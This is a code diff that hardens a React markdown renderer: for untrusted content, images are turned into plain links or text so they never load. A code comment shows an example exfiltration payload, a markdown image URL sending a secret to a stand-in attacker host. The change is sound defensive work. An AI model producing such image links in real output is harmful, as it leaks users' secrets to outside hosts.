@@ -105,6 +105,30 @@ const mdComponents = {
   pre: ({ children }: { children?: React.ReactNode }) => <>{children}</>,
 };
 
+/**
+ * Untrusted output (allowHtml=false): a markdown image is never loaded — loading it would send a request to a URL
+ * the content chose (e.g. `![x](https://evil.example/?q=<secret>)` exfiltration). http(s) images become a plain
+ * link the user may open; anything else (data:, relative, javascript:) is shown as text only.
+ */
+function SafeImage({ src, alt }: { src?: unknown; alt?: string }) {
+  const label = alt?.trim() || "";
+  if (typeof src === "string" && /^https?:\/\//i.test(src)) {
+    return (
+      <a
+        href={src}
+        target="_blank"
+        rel="noopener noreferrer"
+        className="text-primary underline underline-offset-2 hover:text-primary/80"
+      >
+        🖼 {label || src}
+      </a>
+    );
+  }
+  return <span>{label ? `🖼 ${label}` : ""}</span>;
+}
+
+const safeMdComponents = { ...mdComponents, img: SafeImage };
+
 interface MarkdownRendererProps {
   content: string;
   isStreaming?: boolean;
@@ -133,7 +157,7 @@ export const MarkdownRenderer = memo(function MarkdownRenderer({
       <ReactMarkdown
         remarkPlugins={[remarkGfm]}
         rehypePlugins={allowHtml ? [rehypeRaw] : []}
-        components={mdComponents as never}
+        components={(allowHtml ? mdComponents : safeMdComponents) as never}
       >
         {content}
       </ReactMarkdown>
